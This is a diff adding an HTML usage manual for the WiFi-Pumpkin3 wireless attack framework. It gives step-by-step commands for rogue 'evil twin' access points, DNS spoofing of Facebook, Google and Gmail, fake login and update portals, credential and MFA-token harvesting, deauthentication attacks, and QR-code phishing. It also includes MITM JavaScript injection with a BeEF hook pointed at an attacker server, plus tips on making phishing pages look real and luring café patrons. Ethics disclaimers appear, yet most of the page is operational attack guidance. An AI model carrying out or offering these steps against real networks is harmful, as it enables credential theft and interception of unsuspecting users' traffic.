@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WiFi-Pumpkin3 - Ultimate Manual</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { font-family: 'Segoe UI', sans-serif; }
+    .tab-link.active {
+      background-color: #06b6d4;
+      color: #1e293b;
+    }
+    .tab-content {
+      display: none;
+    }
+  </style>
+</head>
+<body class="bg-gray-900 text-white p-6">
+  <div class="max-w-7xl mx-auto">
+    <h1 class="text-4xl font-bold text-cyan-400 mb-2">📡 WiFi-Pumpkin3 - Complete Manual</h1>
+    <p class="text-yellow-400 mb-6">⚠️ Ethical Hacking Use Only — Never attack unauthorized networks.</p>
+
+    <!-- Tabs Navigation -->
+    <div class="flex flex-wrap border-b border-gray-700 gap-2 pb-2 overflow-x-auto">
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'install')" id="defaultOpen">Installation</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'ap')">Fake AP</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'dnsspoof')">DNS Spoofing</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'captive')">CaptiveFlask</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'creds')">Cred Harvest</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'deauth')">Deauth Attack</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'phishkin3')">Phishkin3</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'evilqr3')">EvilQR3</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'mitm')">MITM + JS</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'proxy')">Transparent Proxy</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'scanner')">WiFi Scanner</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'dnsmonitor')">DNS Monitor</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-cyan-600" onclick="openTab(event, 'api')">REST API</button>
+      <button class="tab-link px-4 py-2 rounded-md bg-gray-800 hover:bg-green-500" onclick="openTab(event, 'logs')">Logs & Updates</button>
+    </div>
+
+    <!-- Installation Tab -->
+    <div id="install" class="tab-content mt-6">
+      <h2 class="text-2xl font-bold text-cyan-300 mb-4">🧰 Installation</h2>
+      <p>WiFi-Pumpkin3 works best on Kali Linux or Parrot OS.</p>
+      <ul class="list-disc pl-6 mb-4 text-gray-300">
+        <li>Python 3.8+</li>
+        <li>Hostapd, Dnsmasq</li>
+        <li>Wireless adapter (monitor mode)</li>
+      </ul>
+      <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code># Clone the repository
+git clone https://github.com/P0cL4bs/WiFi-Pumpkin3.git
+cd WiFi-Pumpkin3
+
+# Run installer
+sudo ./installer.sh --install
+
+# Or manual setup:
+sudo apt install python3-pip hostapd dnsmasq
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+sudo python3 wifi-pumpkin.py</code></pre>
+      <p class="mt-4 text-yellow-400">✅ Tip: Run with sudo to avoid interface permission issues.</p>
+    </div>
+<!-- Fake Access Point -->
+<div id="ap" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">🌐 Create Rogue Access Point (Evil Twin)</h2>
+  <p class="mb-2">This creates a fake Wi-Fi network with the same SSID as a real one. Victims connect thinking it’s legit.</p>
+
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>use accesspoint
+set ssid Free_WiFi
+set channel 6
+start</code></pre>
+
+  <p class="text-yellow-300 mt-2">✅ Tip: Match the SSID and channel of a real nearby network for best results.</p>
+</div>
+
+<!-- DNS Spoofing -->
+<div id="dnsspoof" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">🌍 DNS Spoofing</h2>
+  <p>Redirect specific domain requests to your rogue server/IP.</p>
+
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>use dnsspoof
+set target_domain facebook.com
+set redirect_ip 10.0.0.1
+start</code></pre>
+
+  <p class="mt-4">To spoof multiple domains, create a DNS mapping file:</p>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>facebook.com 10.0.0.1
+google.com   10.0.0.1
+gmail.com    10.0.0.1</code></pre>
+
+  <p class="mt-2">Then:</p>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>set dns_file path/to/spooflist.txt
+start</code></pre>
+
+  <p class="text-yellow-400 mt-2">✅ Tip: Combine with CaptiveFlask to serve fake login pages.</p>
+</div>
+
+<!-- CaptiveFlask -->
+<div id="captive" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">🚪 CaptiveFlask – Fake Login & Update Portals</h2>
+  <p>This plugin forces the victim to interact with a fake login/update page.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Available Templates:</h3>
+  <ul class="list-disc pl-6 mb-4 text-gray-300">
+    <li><code>facebook</code> – Fake Facebook login</li>
+    <li><code>google</code> – Fake Google login</li>
+    <li><code>windows-update</code> – Fake Windows update screen</li>
+    <li><code>android-update</code> – Fake Android OTA prompt</li>
+  </ul>
+
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>use captiveflask
+set template facebook
+start</code></pre>
+
+  <p class="mt-4">Custom templates can be added to:</p>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>plugins/captiveflask/templates/</code></pre>
+
+  <p class="text-yellow-400 mt-2">✅ Example: Serve a fake update screen when victim connects to Free_WiFi.</p>
+</div>
+
+<!-- Credential Harvesting -->
+<div id="creds" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">🔐 Credential Harvesting</h2>
+  <p>Any credentials entered on fake login pages are logged automatically.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Log Location:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>logs/credentials.log</code></pre>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Example Log Entry:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-green-200 text-sm overflow-x-auto"><code>[facebook] 192.168.0.101
+username: victim@example.com
+password: pass12345</code></pre>
+
+  <p class="mt-4">You can tail the log in real-time:</p>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>tail -f logs/credentials.log</code></pre>
+</div>
+<!-- Deauthentication Attack -->
+<div id="deauth" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">💥 Deauthentication Attack</h2>
+  <p>Disconnects users from legitimate Wi-Fi so they reconnect to your rogue AP.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Steps:</h3>
+  <ol class="list-decimal pl-6 text-gray-300 mb-4">
+    <li>Put Wi-Fi card into monitor mode</li>
+    <li>Select target MAC</li>
+    <li>Run deauth attack</li>
+  </ol>
+
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code># Step 1: Enable monitor mode
+sudo airmon-ng start wlan0
+
+# Step 2: Launch WiFi-Pumpkin3
+use deauth
+set interface wlan0mon
+set target_mac AA:BB:CC:DD:EE:FF
+start</code></pre>
+
+  <p class="text-yellow-300 mt-2">✅ Tip: Use airodump-ng to find MAC addresses of targets.</p>
+</div>
+
+<!-- Phishkin3 -->
+<div id="phishkin3" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">🎭 Phishkin3 – MFA Phishing</h2>
+  <p>Clones real MFA-enabled login portals. Captures username, password, and 2FA token.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Available Templates:</h3>
+  <ul class="list-disc pl-6 text-gray-300 mb-4">
+    <li><code>microsoft</code> – Outlook/Microsoft Office login</li>
+    <li><code>google-mfa</code> – Google with 2FA</li>
+  </ul>
+
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>use phishkin3
+set template microsoft
+start</code></pre>
+
+  <p class="text-yellow-300 mt-2">✅ Use this only in a lab. Real-time proxying of credentials is for advanced red team simulations.</p>
+</div>
+
+<!-- EvilQR3 -->
+<div id="evilqr3" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">📸 EvilQR3 – QR Code Phishing</h2>
+  <p>Generates phishing QR codes. When scanned by a phone, it opens your rogue site.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Steps:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>use evilqr3
+set url http://10.0.0.1/facebook
+generate</code></pre>
+
+  <p class="text-gray-300 mt-4">A PNG image file will be created with the QR code. You can print it, send it, or place it in fake environments.</p>
+
+  <h3 class="text-green-300 font-semibold mt-4">💡 Example Use:</h3>
+  <ul class="list-disc pl-6 text-gray-300">
+    <li>Stick QR on a coffee shop table: “Free WiFi Setup”</li>
+    <li>Redirect to captive portal</li>
+  </ul>
+</div>
+
+<!-- MITM + JavaScript Injection -->
+<div id="mitm" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">🕵️ MITM + JavaScript Injection</h2>
+  <p>Intercepts HTTP traffic and injects your custom JavaScript.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Steps:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>use mitm
+set inject_js /home/user/scripts/inject.js
+start</code></pre>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">📄 Sample JS: Alert Box</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>// inject-alert.js
+alert("⚠️ This is a test from MITM JavaScript injection!");</code></pre>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">📄 Sample JS: BeEF Hook</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>// inject-beef.js
+&lt;script src="http://your-beef-server/hook.js"&gt;&lt;/script&gt;</code></pre>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">📄 Sample JS: Redirect to Phishing</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>// redirect.js
+window.location.href = "http://10.0.0.1/login";</code></pre>
+
+  <p class="text-yellow-300 mt-4">✅ Only works on HTTP (unencrypted) traffic. HTTPS cannot be modified this way.</p>
+</div>
+<!-- Transparent Proxy -->
+<div id="proxy" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">🧪 Transparent Proxy</h2>
+  <p>Intercept and modify traffic between client and server silently (MITM-style).</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Basic Usage:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>use transparentproxy
+set inject_js /home/user/scripts/hook.js
+start</code></pre>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Example JS for Proxy Injection:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>// proxy-inject.js
+console.log("✅ Transparent Proxy Injected Successfully!");
+alert("This page was intercepted by the proxy.");</code></pre>
+
+  <p class="text-yellow-300 mt-4">✅ Ideal for lab-based phishing or hooking browsers with BeEF.</p>
+</div>
+
+<!-- WiFi Scanner -->
+<div id="scanner" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">📶 WiFi Scanner</h2>
+  <p>Scans for all nearby wireless networks.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Steps:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code># First, put adapter into monitor mode:
+sudo airmon-ng start wlan0
+
+use scanner
+set interface wlan0mon
+start</code></pre>
+
+  <h3 class="text-green-300 font-semibold mt-4">Output Includes:</h3>
+  <ul class="list-disc pl-6 text-gray-300">
+    <li>SSID</li>
+    <li>BSSID (MAC address)</li>
+    <li>Signal strength (RSSI)</li>
+    <li>Channel</li>
+    <li>Encryption type</li>
+  </ul>
+</div>
+
+<!-- DNS Monitor -->
+<div id="dnsmonitor" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">🔍 DNS Monitor</h2>
+  <p>Monitors and logs all DNS requests from clients.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Usage:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>use dnsmonitor
+start</code></pre>
+
+  <h3 class="text-green-300 font-semibold mt-4">Logs saved to:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>logs/dns_requests.log</code></pre>
+
+  <h3 class="text-green-300 font-semibold mt-4">Example Log Entry:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>[10.0.0.101] -> facebook.com
+[10.0.0.101] -> google.com</code></pre>
+</div>
+
+<!-- RESTful API -->
+<div id="api" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">🔌 RESTful API</h2>
+  <p>WiFi-Pumpkin3 exposes a REST API to control the tool via HTTP requests.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Enable API:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>use api
+set port 5000
+start</code></pre>
+
+  <h3 class="text-green-300 font-semibold mt-4">Example: Start MITM Module via Curl</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>curl -X POST http://localhost:5000/start_attack \
+  -H "Content-Type: application/json" \
+  -d '{"module": "mitm"}'</code></pre>
+
+  <h3 class="text-green-300 font-semibold mt-4">Other Endpoints:</h3>
+  <ul class="list-disc pl-6 text-gray-300">
+    <li><code>/status</code> – Get status of modules</li>
+    <li><code>/stop</code> – Stop current attack</li>
+    <li><code>/logs</code> – Retrieve logs</li>
+  </ul>
+
+  <p class="text-yellow-300 mt-4">✅ You can automate WiFi-Pumpkin3 as part of red team scripts!</p>
+</div>
+<!-- Logs and Updates -->
+<div id="logs" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">📁 Logs & Updates</h2>
+  <p>All captured data is saved for review. Update regularly to get new modules.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Credential Logs:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>logs/credentials.log</code></pre>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">DNS Requests:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>logs/dns_requests.log</code></pre>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">To update WiFi-Pumpkin3:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>cd WiFi-Pumpkin3
+git pull
+sudo ./installer.sh --install</code></pre>
+
+  <p class="text-yellow-300 mt-4">✅ Always update before important testing engagements.</p>
+</div>
+
+<!-- Custom Templates -->
+<div id="templates" class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">🧱 Creating Custom CaptiveFlask Templates</h2>
+  <p>You can build your own login pages and use them as phishing portals.</p>
+
+  <h3 class="text-lg font-semibold text-cyan-200 mt-4">Steps:</h3>
+  <ol class="list-decimal pl-6 text-gray-300 mb-4">
+    <li>Create a folder inside <code>plugins/captiveflask/templates</code></li>
+    <li>Include <code>index.html</code>, <code>style.css</code>, and <code>logo.png</code> (optional)</li>
+    <li>Use <code>{{submit}}</code> to define the form submission endpoint</li>
+  </ol>
+
+  <h3 class="text-green-300 font-semibold mt-4">Sample HTML:</h3>
+  <pre class="bg-gray-800 p-4 rounded text-sm overflow-x-auto"><code>&lt;form action="{{submit}}" method="post"&gt;
+  &lt;input name="username" placeholder="Email" /&gt;
+  &lt;input name="password" type="password" placeholder="Password" /&gt;
+  &lt;button type="submit"&gt;Login&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+
+  <p class="text-yellow-300 mt-4">✅ Add realism: match fonts, logos, button styles of real websites.</p>
+</div>
+
+<!-- Ethical Usage -->
+<div class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">⚖️ Ethical Hacking Usage Reminder</h2>
+  <ul class="list-disc pl-6 text-red-400 mb-4">
+    <li>📛 Never attack networks you don't own or have written permission to test</li>
+    <li>📄 Get signed authorization before pentesting client networks</li>
+    <li>⚖️ Follow local cybersecurity laws and regulations (ex: GDPR, CFAA, IT Act)</li>
+    <li>🛡 Only use this tool in ethical hacking labs or professional audits</li>
+  </ul>
+  <p class="text-green-300">✅ Use your skills to secure — not to harm.</p>
+</div>
+
+<!-- Troubleshooting & FAQ -->
+<div class="tab-content mt-6">
+  <h2 class="text-2xl font-bold text-cyan-300 mb-4">❓ FAQ & Troubleshooting</h2>
+  <ul class="list-disc pl-6 text-gray-300">
+    <li><strong>Q:</strong> Why doesn't captive portal appear?<br>
+        <strong>A:</strong> Ensure DNS spoofing and redirect are enabled. Try disconnect/reconnect on victim device.
+    </li>
+    <li><strong>Q:</strong> Deauth attack not working?<br>
+        <strong>A:</strong> Make sure your Wi-Fi adapter supports monitor mode and packet injection.
+    </li>
+    <li><strong>Q:</strong> Can't run API or MITM?<br>
+        <strong>A:</strong> Run as root or with <code>sudo</code> — some modules require elevated privileges.
+    </li>
+    <li><strong>Q:</strong> CaptiveFlask templates not loading?<br>
+        <strong>A:</strong> Check file names and structure. Must contain <code>index.html</code>.
+    </li>
+  </ul>
+</div>
+<!-- Tabs Script + Close Tags -->
+<script>
+  function openTab(evt, tabName) {
+    const tabcontent = document.getElementsByClassName("tab-content");
+    const tablinks = document.getElementsByClassName("tab-link");
+
+    for (let i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+
+    for (let i = 0; i < tablinks.length; i++) {
+      tablinks[i].classList.remove("active");
+    }
+
+    document.getElementById(tabName).style.display = "block";
+    evt.currentTarget.classList.add("active");
+  }
+
+  document.getElementById("defaultOpen").click();
+</script>
+
+</div> <!-- end container -->
+</body>
+</html>
